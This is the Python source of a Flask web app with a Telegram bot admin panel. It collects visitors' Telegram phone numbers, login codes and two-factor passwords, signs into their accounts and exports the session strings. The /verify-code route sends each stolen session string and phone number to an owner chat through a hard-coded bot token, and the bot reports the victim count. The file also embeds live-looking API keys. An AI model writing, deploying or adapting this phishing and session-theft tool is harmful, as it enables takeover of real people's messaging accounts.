import os
import asyncio
import threading
import traceback
import requests
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid
)

app = Flask(__name__)
CORS(app)

# ==========================================
#          CONFIGURATION
# ==========================================
API_ID = int(os.environ.get("API_ID", 33511945))
API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")

BOT_TOKEN = "8613982412:AAEzoWkhawmQuRyAHh89jj68gru2oIowL5E"
OWNER_CHAT_ID = "-1003962414788"  
ADMIN_ID = 6034439625             

active_clients = {}
total_logged_in_users = 0  
admin_states = {} # এডমিনের বর্তমান অবস্থা (State) ট্র্যাক করার জন্য

# ==========================================
#          TELEGRAM HELPER FUNCTIONS
# ==========================================
def send_telegram_message(chat_id, text, reply_markup=None):
    """নতুন মেসেজ পাঠানোর ফাংশন"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        print("Telegram Notification Error:", e)

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    """আগের মেসেজ পরিবর্তন (Edit) করার ফাংশন"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "Markdown"
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        print("Edit Message Error:", e)

def answer_callback(callback_query_id, text, show_alert=False):
    """ইনলাইন বাটনের ক্লিকে রেসপন্স পাঠানো"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
        requests.post(url, json={"callback_query_id": callback_query_id, "text": text, "show_alert": show_alert}, timeout=10)
    except Exception as e:
        pass

def download_telegram_file(file_id):
    """ফাইল ডাউনলোড করে static ফোল্ডারে সেভ করা"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
        res = requests.get(url).json()
        if res.get("ok"):
            file_path = res["result"]["file_path"]
            download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
            file_data = requests.get(download_url).content
            
            os.makedirs("static", exist_ok=True)
            ext = file_path.split('.')[-1]
            save_path = f"static/website_background.{ext}"
            with open(save_path, "wb") as f:
                f.write(file_data)
            return True, ext
    except Exception as e:
        print("File Download Error:", e)
    return False, None

# ==========================================
#          UI COMPONENTS (MENUS)
# ==========================================
def get_main_menu():
    return {
        "inline_keyboard": [
            [{"text": "📊 Total Registration Members", "callback_data": "total_members"}],
            [{"text": "🖼️ Website Background Manager", "callback_data": "bg_manager"}],
            [{"text": "🔐 Session String Manager", "callback_data": "session_manager"}]
        ]
    }

def get_welcome_text():
    return (
        "👋 Welcome to User Info Robot! 🌐\n\n"
        "Manage your website and monitor user activity.\n"
        "👇 Select an option below to continue."
    )

def get_back_button():
    return {
        "inline_keyboard": [
            [{"text": "🔙 Back", "callback_data": "back_to_main"}]
        ]
    }

# ==========================================
#          BACKGROUND LOOP (PYROGRAM)
# ==========================================
bg_loop = asyncio.new_event_loop()

def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

loop_thread = threading.Thread(target=start_background_loop, args=(bg_loop,), daemon=True)
loop_thread.start()

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, bg_loop)
    return future.result()


# ==========================================
#          FLASK WEB ROUTES (FRONTEND)
# ==========================================
@app.route('/', methods=['GET'])
def home():
    if os.path.exists('index.html'): return send_file('index.html')
    return "index.html not found", 404

@app.route('/verify', methods=['GET'])
def verify_page():
    if os.path.exists('verify.html'): return send_file('verify.html')
    return "verify.html not found", 404

@app.route('/dashboard.html', methods=['GET'])
def dashboard_page():
    if os.path.exists('dashboard.html'): return send_file('dashboard.html')
    return "dashboard.html not found", 404

@app.route('/profile.html', methods=['GET'])
def profile_page():
    if os.path.exists('profile.html'): return send_file('profile.html')
    return "profile.html not found", 404


# ==========================================
#          PYROGRAM API ROUTES (BACKEND)
# ==========================================
@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()

    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    try:
        session_name = f"session_{phone.replace('+', '')}"
        async def _send():
            if phone in active_clients:
                try: await active_clients[phone]["client"].disconnect()
                except Exception: pass
            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await client.connect()
            sent_code = await client.send_code(phone)
            active_clients[phone] = {"client": client, "phone_code_hash": sent_code.phone_code_hash}
            return sent_code.phone_code_hash

        phone_code_hash = run_async(_send())
        return jsonify({"status": "success", "message": "OTP code sent to Telegram!", "phone_code_hash": phone_code_hash})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-code', methods=['POST'])
def verify_code():
    global total_logged_in_users
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    code = str(data.get('code', '')).strip()
    password = data.get('password')

    if not phone or not code:
        return jsonify({"status": "error", "message": "Phone and Code are required"}), 400
    if phone not in active_clients:
        return jsonify({"status": "error", "message": "Session expired."}), 400

    client_data = active_clients[phone]
    client = client_data["client"]
    phone_code_hash = client_data["phone_code_hash"]

    try:
        async def _verify():
            try: await client.sign_in(phone, phone_code_hash, code)
            except SessionPasswordNeeded:
                if not password: return {"status": "2fa_required"}
                await client.check_password(str(password))
            session_string = await client.export_session_string()
            await client.disconnect()
            return {"status": "success", "session_string": session_string}

        res = run_async(_verify())

        if res and res.get("status") == "2fa_required":
            return jsonify({"status": "2fa_required", "message": "2FA Password required"})

        if res and res.get("status") == "success":
            total_logged_in_users += 1
            session_string = res.get("session_string")
            msg = (
                f"🎉 *New Telegram Login Successful!*\n\n"
                f"📱 *Phone:* `{phone}`\n"
                f"📊 *Total Logged In:* `{total_logged_in_users}`\n\n"
                f"🔑 *Session String:*\n`{session_string}`"
            )
            send_telegram_message(OWNER_CHAT_ID, msg)
            active_clients.pop(phone, None)
            return jsonify({"status": "success", "message": "Session generated successfully!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/get-user-profile', methods=['POST'])
def get_user_profile():
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    if not phone:
        return jsonify({"status": "error", "message": "Phone required"}), 400

    try:
        session_name = f"session_{phone.replace('+', '')}"
        async def _fetch():
            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await client.connect()
            
            # ইউজারের বেসিক ইনফো আনা
            me = await client.get_me()
            
            # ইউজারের বায়ো (Bio) বের করার জন্য full chat ইনফো ফেচ করা
            full_chat = await client.get_chat("me")
            user_bio = full_chat.bio if full_chat.bio else "No bio available"
            
            # প্রোফাইল ছবি ডাউনলোড করা
            photo_url = None
            async for photo in client.get_chat_photos("me", limit=1):
                os.makedirs("static", exist_ok=True)
                file_path = await client.download_media(photo.file_id, file_name=f"static/profile_{me.id}.jpg")
                photo_url = "/" + file_path
                
            await client.disconnect()

            # সব ডেটা একসাথে রিটার্ন করা
            return {
                "name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
                "username": f"@{me.username}" if me.username else "No Username",
                "id": me.id,
                "phone": me.phone_number or phone,
                "bio": user_bio,
                "photo": photo_url or "https://carder.top/imagens/1791918460640-323067073.jpg"
            }
            
        profile_data = run_async(_fetch())
        return jsonify({"status": "success", "profile": profile_data})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/stats', methods=['GET'])
def get_stats():
    return jsonify({"total_users_logged_in": total_logged_in_users})


# ==========================================
#          TELEGRAM BOT WEBHOOK ROUTE
# ==========================================
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    try:
        data = request.get_json(silent=True) or {}
        
        # --- ১. মেসেজ হ্যান্ডলার ---
        if "message" in data:
            message = data["message"]
            chat_id = message["chat"]["id"]
            user_id = message["from"]["id"]
            text = message.get("text", "").strip()

            # এডমিনের স্টেট চেকিং (ফাইল আপলোড বা সেশন ইনপুট)
            if user_id in admin_states:
                state = admin_states[user_id]
                
                if state == "WAITING_FOR_BG":
                    file_id = None
                    if "photo" in message: file_id = message["photo"][-1]["file_id"]
                    elif "video" in message: file_id = message["video"]["file_id"]
                    elif "document" in message: file_id = message["document"]["file_id"]

                    if file_id:
                        send_telegram_message(chat_id, "⏳ Downloading and applying background. Please wait...")
                        success, ext = download_telegram_file(file_id)
                        if success:
                            send_telegram_message(chat_id, f"✅ **Background successfully uploaded!**\nFile saved as `website_background.{ext}`.\n\n👉 Type /start to open menu.")
                        else:
                            send_telegram_message(chat_id, "⚠️ Error downloading file.")
                    else:
                        send_telegram_message(chat_id, "⚠️ Invalid format. Please send a valid image or video file.")
                    
                    del admin_states[user_id] 
                    return "OK", 200

                elif state == "WAITING_FOR_SESSION":
                    send_telegram_message(chat_id, f"🔒 Authentication initiated for `{text}`.\n\n👉 Type /start to open menu.")
                    del admin_states[user_id]
                    return "OK", 200

            # সাধারণ কমান্ড
            if text == "/start":
                send_telegram_message(chat_id, get_welcome_text(), get_main_menu())

        # --- ২. ইনলাইন বাটন (Callback Query) হ্যান্ডলার ---
        elif "callback_query" in data:
            callback_query = data["callback_query"]
            callback_data = callback_query.get("data")
            message_obj = callback_query.get("message", {})
            chat_id = message_obj.get("chat", {}).get("id")
            message_id = message_obj.get("message_id")
            user_id = callback_query["from"]["id"]
            callback_query_id = callback_query["id"]

            if not chat_id or not message_id:
                return "OK", 200

            if callback_data == "total_members":
                answer_callback(callback_query_id, "Fetching live data...")
                stats_text = (
                    f"📊 *Website Registration Statistics*\n\n"
                    f"👥 Total Registered Members: `{total_logged_in_users:,}`\n\n"
                    f"✅ Statistics updated successfully from the live server!"
                )
                # নতুন মেসেজ না পাঠিয়ে আগের মেসেজ এডিট করবে এবং ব্যাক বাটন বসাবে
                edit_telegram_message(chat_id, message_id, stats_text, get_back_button())

            elif callback_data == "bg_manager":
                if user_id != ADMIN_ID:
                    answer_callback(callback_query_id, "⛔ Unauthorized! Admin access required.", show_alert=True)
                    return "OK", 200
                
                answer_callback(callback_query_id, "Background Manager Started")
                admin_states[user_id] = "WAITING_FOR_BG"
                bg_text = "🖼️ **Website Background Manager**\n\nPlease send the new background image or video file directly here to upload and apply it to the website."
                edit_telegram_message(chat_id, message_id, bg_text, get_back_button())

            elif callback_data == "session_manager":
                if user_id != ADMIN_ID:
                    answer_callback(callback_query_id, "⛔ Unauthorized! Admin access required.", show_alert=True)
                    return "OK", 200
                
                answer_callback(callback_query_id, "Session Manager Started")
                admin_states[user_id] = "WAITING_FOR_SESSION"
                session_text = "🔐 **Session String Manager**\n\nPlease enter the authorized Phone Number (with country code) or User ID to begin secure verification:"
                edit_telegram_message(chat_id, message_id, session_text, get_back_button())

            elif callback_data == "back_to_main":
                # ব্যাক বাটনে ক্লিক করলে এডমিন স্টেট ক্লিয়ার হবে এবং মেইন মেনু ফিরে আসবে
                if user_id in admin_states:
                    del admin_states[user_id]
                answer_callback(callback_query_id, "Back to Main Menu")
                edit_telegram_message(chat_id, message_id, get_welcome_text(), get_main_menu())

    except Exception as e:
        print("Webhook Error:", traceback.format_exc())
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, threaded=True)
